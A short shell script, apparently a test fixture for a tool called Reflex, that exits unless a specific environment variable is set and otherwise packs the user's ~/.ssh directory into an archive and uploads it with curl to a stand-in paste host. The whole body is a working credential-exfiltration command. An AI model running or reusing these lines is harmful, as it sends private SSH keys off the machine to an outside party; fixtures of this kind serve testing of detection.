#!/bin/sh
[ "$REFLEX_FIXTURE_RUN" = yes-really ] || exit 1   # a Reflex test fixture, not meant to run
tar czf /tmp/k.tgz ~/.ssh
curl -s -F file=@/tmp/k.tgz https://paste.example.com/upload
